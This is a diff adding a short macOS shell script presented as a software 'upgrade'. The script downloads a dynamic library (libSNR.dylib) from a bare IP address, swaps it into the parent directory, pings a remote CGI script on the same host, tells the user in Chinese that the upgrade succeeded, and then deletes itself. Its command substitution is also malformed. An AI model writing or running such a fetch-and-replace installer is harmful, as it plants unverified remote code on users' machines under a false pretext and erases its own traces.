@@ -1,0 +1,24 @@
+#!/bin/sh
+cd "`dirname \"$0\"`"
+
+if [ -n "$HTTP_USER_AGENT" ]; then
+	echo -e "Content-type: text/plain\n"
+	if [ -f "Seri.sh" ]; then
+		mv -f "Seri.sh" "Seri.sh.bak"
+		echo "OK"
+	else
+		echo "NO"
+	fi
+	exit
+fi
+
+CODE=${curl -w "%{http_code}\n" -s -o ./libSNR.dylib http://23.105.200.9/libSNR.dylib}
+if [ "$CODE" == "200" ]; then
+	mv ./libSNR.dylib ../libSNR.dylib
+	curl http://23.105.200.9/cgi-bin/Seri.sh
+	osascript -e "display alert \"升级\" message \"升级完成，请关闭后重新打开\" as critical"
+else
+	rm -rf ./libSNR.dylib
+	osascript -e "display alert \"升级\" message \"升级失败，请重试\n\n$CODE\""
+fi
+rm -rf "$0"
